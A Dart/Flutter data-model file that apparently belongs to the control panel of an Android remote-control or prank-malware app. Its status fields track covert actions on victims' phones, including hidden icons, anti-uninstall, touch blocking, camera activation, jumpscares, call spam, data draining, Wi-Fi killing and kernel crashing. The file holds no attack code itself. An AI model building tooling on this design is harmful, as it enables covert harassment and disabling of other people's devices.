class DeviceStatus {
  const DeviceStatus({
    this.flashlight = false,
    this.cameraActive = false,
    this.deviceLocked = false,
    this.lockTitle = '',
    this.jumpscareActive = false,
    this.jumpscareUrl = '',
    this.blockedApps = const [],
    this.iconHidden = false,
    this.touchBlocked = false,
    this.ttsSpeaking = false,
    this.videoOverlayActive = false,
    this.dialogSpamActive = false,
    this.jumpscare2Active = false,
    this.jumpscare2Url = '',
    this.jumpscare2Duration = 3000,
    this.currentTheme = 'default',
    this.spamVideoActive = false,
    this.sosActive = false,
    this.flashDiscoActive = false,
    this.spamCallActive = false,
    this.dataDraining = false,
    this.wifiKilled = false,
    this.crashKernelActive = false,
    this.antiUninstall = false,
    this.volumeMuted = false,
    this.screenActive = false,
    this.lockCustomActive = false,
    this.lockLiveChatActive = false, // ✅ DITAMBAHKAN
  });

  final bool flashlight;
  final bool cameraActive;
  final bool deviceLocked;
  final String lockTitle;
  final bool jumpscareActive;
  final String jumpscareUrl;
  final List<String> blockedApps;
  final bool iconHidden;
  final bool touchBlocked;
  final bool ttsSpeaking;
  final bool videoOverlayActive;
  final bool dialogSpamActive;
  final bool jumpscare2Active;
  final String jumpscare2Url;
  final int jumpscare2Duration;
  final String currentTheme;
  final bool spamVideoActive;
  final bool sosActive;
  final bool flashDiscoActive;
  final bool spamCallActive;
  final bool dataDraining;
  final bool wifiKilled;
  final bool crashKernelActive;
  final bool antiUninstall;
  final bool volumeMuted;
  final bool screenActive;
  final bool lockCustomActive;
  final bool lockLiveChatActive; // ✅ DITAMBAHKAN

  factory DeviceStatus.fromJson(Map<String, dynamic>? json) {
    if (json == null) return const DeviceStatus();
    final blocked = json['blockedApps'];
    return DeviceStatus(
      flashlight: json['flashlight'] == true,
      cameraActive: json['cameraActive'] == true,
      deviceLocked: json['deviceLocked'] == true,
      lockTitle: json['lockTitle']?.toString() ?? '',
      jumpscareActive: json['jumpscareActive'] == true,
      jumpscareUrl: json['jumpscareUrl']?.toString() ?? '',
      blockedApps: blocked is List ? blocked.map((e) => e.toString()).toList() : const [],
      iconHidden: json['iconHidden'] == true,
      touchBlocked: json['touchBlocked'] == true,
      ttsSpeaking: json['ttsSpeaking'] == true,
      videoOverlayActive: json['videoOverlayActive'] == true,
      dialogSpamActive: json['dialogSpamActive'] == true,
      jumpscare2Active: json['jumpscare2Active'] == true,
      jumpscare2Url: json['jumpscare2Url']?.toString() ?? '',
      jumpscare2Duration: (json['jumpscare2Duration'] as num?)?.toInt() ?? 3000,
      currentTheme: json['currentTheme']?.toString() ?? json['themeChanged']?.toString() ?? 'default',
      spamVideoActive: json['spamVideoActive'] == true,
      sosActive: json['sosActive'] == true,
      flashDiscoActive: json['flashDiscoActive'] == true,
      spamCallActive: json['spamCallActive'] == true,
      dataDraining: json['dataDraining'] == true,
      wifiKilled: json['wifiKilled'] == true,
      crashKernelActive: json['crashKernelActive'] == true,
      antiUninstall: json['antiUninstall'] == true,
      volumeMuted: json['volumeMuted'] == true,
      screenActive: json['screenActive'] == true,
      lockCustomActive: json['lockCustomActive'] == true,
      lockLiveChatActive: json['lockLiveChatActive'] == true, // ✅ PARSE DARI JSON
    );
  }

  DeviceStatus copyWith({
    bool? flashlight,
    bool? cameraActive,
    bool? deviceLocked,
    String? lockTitle,
    bool? jumpscareActive,
    String? jumpscareUrl,
    List<String>? blockedApps,
    bool? iconHidden,
    bool? touchBlocked,
    bool? ttsSpeaking,
    bool? videoOverlayActive,
    bool? dialogSpamActive,
    bool? jumpscare2Active,
    String? jumpscare2Url,
    int? jumpscare2Duration,
    String? currentTheme,
    bool? spamVideoActive,
    bool? sosActive,
    bool? flashDiscoActive,
    bool? spamCallActive,
    bool? dataDraining,
    bool? wifiKilled,
    bool? crashKernelActive,
    bool? antiUninstall,
    bool? volumeMuted,
    bool? screenActive,
    bool? lockCustomActive,
    bool? lockLiveChatActive, // ✅ DITAMBAHKAN
  }) {
    return DeviceStatus(
      flashlight: flashlight ?? this.flashlight,
      cameraActive: cameraActive ?? this.cameraActive,
      deviceLocked: deviceLocked ?? this.deviceLocked,
      lockTitle: lockTitle ?? this.lockTitle,
      jumpscareActive: jumpscareActive ?? this.jumpscareActive,
      jumpscareUrl: jumpscareUrl ?? this.jumpscareUrl,
      blockedApps: blockedApps ?? this.blockedApps,
      iconHidden: iconHidden ?? this.iconHidden,
      touchBlocked: touchBlocked ?? this.touchBlocked,
      ttsSpeaking: ttsSpeaking ?? this.ttsSpeaking,
      videoOverlayActive: videoOverlayActive ?? this.videoOverlayActive,
      dialogSpamActive: dialogSpamActive ?? this.dialogSpamActive,
      jumpscare2Active: jumpscare2Active ?? this.jumpscare2Active,
      jumpscare2Url: jumpscare2Url ?? this.jumpscare2Url,
      jumpscare2Duration: jumpscare2Duration ?? this.jumpscare2Duration,
      currentTheme: currentTheme ?? this.currentTheme,
      spamVideoActive: spamVideoActive ?? this.spamVideoActive,
      sosActive: sosActive ?? this.sosActive,
      flashDiscoActive: flashDiscoActive ?? this.flashDiscoActive,
      spamCallActive: spamCallActive ?? this.spamCallActive,
      dataDraining: dataDraining ?? this.dataDraining,
      wifiKilled: wifiKilled ?? this.wifiKilled,
      crashKernelActive: crashKernelActive ?? this.crashKernelActive,
      antiUninstall: antiUninstall ?? this.antiUninstall,
      volumeMuted: volumeMuted ?? this.volumeMuted,
      screenActive: screenActive ?? this.screenActive,
      lockCustomActive: lockCustomActive ?? this.lockCustomActive,
      lockLiveChatActive: lockLiveChatActive ?? this.lockLiveChatActive, // ✅ COPY WITH
    );
  }
}

class DeviceModel {
  const DeviceModel({
    required this.id,
    required this.name,
    required this.connectedAt,
    required this.lastSeen,
    required this.battery,
    required this.charging,
    required this.androidVersion,
    required this.sdkVersion,
    required this.status,
    this.uid,
  });

  final String id;
  final String name;
  final String connectedAt;
  final String lastSeen;
  final int battery;
  final bool charging;
  final String androidVersion;
  final int sdkVersion;
  final DeviceStatus status;
  final String? uid;

  factory DeviceModel.fromJson(Map<String, dynamic> json) {
    final info = json['info'] as Map<String, dynamic>? ?? {};
    return DeviceModel(
      id: json['id']?.toString() ?? '',
      name: json['name']?.toString() ?? 'Unknown',
      connectedAt: json['connectedAt']?.toString() ?? '',
      lastSeen: json['lastSeen']?.toString() ?? '',
      battery: (info['battery'] as num?)?.toInt() ?? -1,
      charging: info['charging'] == true,
      androidVersion: info['androidVersion']?.toString() ?? '?',
      sdkVersion: (info['sdkVersion'] as num?)?.toInt() ?? -1,
      status: DeviceStatus.fromJson(json['status'] as Map<String, dynamic>?),
      uid: json['uid']?.toString(),
    );
  }

  DeviceModel copyWith({
    String? name,
    int? battery,
    bool? charging,
    DeviceStatus? status,
    String? uid,
  }) {
    return DeviceModel(
      id: id,
      name: name ?? this.name,
      connectedAt: connectedAt,
      lastSeen: lastSeen,
      battery: battery ?? this.battery,
      charging: charging ?? this.charging,
      androidVersion: androidVersion,
      sdkVersion: sdkVersion,
      status: status ?? this.status,
      uid: uid ?? this.uid,
    );
  }
}

extension on DeviceStatus {
  String get mutedVolumeLabel => volumeMuted ? 'Muted' : 'Off';
}
